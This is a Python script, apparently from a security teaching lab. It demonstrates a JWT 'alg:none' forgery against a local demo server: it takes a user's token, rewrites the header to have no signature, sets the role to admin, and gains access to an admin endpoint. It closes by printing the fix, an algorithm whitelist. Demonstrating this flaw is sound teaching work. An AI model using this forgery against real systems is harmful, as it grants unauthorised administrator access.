import json
import base64
import requests

BASE_URL = "http://localhost:3000"


def b64url_encode(obj):
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()


def b64url_decode(s):
    s += "=" * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))


def banner(title):
    print("\n" + "-" * 60)
    print(" " + title)
    print("-" * 60)


def run():
    banner("ATTAQUE 1 : alg:none — forge de token sans signature")

    print("\n[1] Connexion avec alice (role: user)...")
    r = requests.post(f"{BASE_URL}/auth/login", json={"username": "alice", "password": "password123"})
    token = r.json()["token"]
    print(f"    Token legitime : {token}")

    header_b64, payload_b64, _ = token.split(".")
    original_header = b64url_decode(header_b64)
    original_payload = b64url_decode(payload_b64)

    print("\n[2] Decodage du token :")
    print(f"    Header  : {json.dumps(original_header)}")
    print(f"    Payload : {json.dumps(original_payload)}")

    print("\n[3] Forge du token malveillant...")
    forged_header = b64url_encode({"alg": "none", "typ": "JWT"})
    forged_payload = b64url_encode({**original_payload, "role": "admin"})
    forged_token = f"{forged_header}.{forged_payload}."

    print(f'    Header forge  : {json.dumps({"alg": "none", "typ": "JWT"})}')
    print(f"    Payload forge : {json.dumps({**original_payload, 'role': 'admin'})}")
    print(f"    Token forge   : {forged_token}")

    print("\n[4] Acces a /api/admin avec le token alg:none...")
    admin_res = requests.get(f"{BASE_URL}/api/admin", headers={"Authorization": f"Bearer {forged_token}"})
    admin_data = admin_res.json()

    if admin_res.ok:
        print("\nATTAQUE REUSSIE — acces admin obtenu sans connaitre le secret !")
        print(f"   Reponse : {json.dumps(admin_data, indent=2)}")
    else:
        print("\nAttaque echouee (serveur probablement durci).")
        print(f"   Reponse : {json.dumps(admin_data)}")

    print("\n[5] Controle : /api/admin avec le token legitime d'alice (role:user)...")
    check_res = requests.get(f"{BASE_URL}/api/admin", headers={"Authorization": f"Bearer {token}"})
    check_data = check_res.json()
    print(f"    HTTP {check_res.status_code} — {check_data.get('error', check_data.get('message'))}")

    banner("FIN DE L'ATTAQUE 1")
    print("\nCorrection : utiliser une whitelist d'algorithmes cote serveur.")
    print('Exemple PyJWT :  jwt.decode(token, secret, algorithms=["HS256"])\n')


if __name__ == "__main__":
    try:
        run()
    except requests.ConnectionError:
        print("\n[ERREUR] Impossible de contacter le serveur.")
        print("-> Assurez-vous que le serveur est lance : python server.py\n")
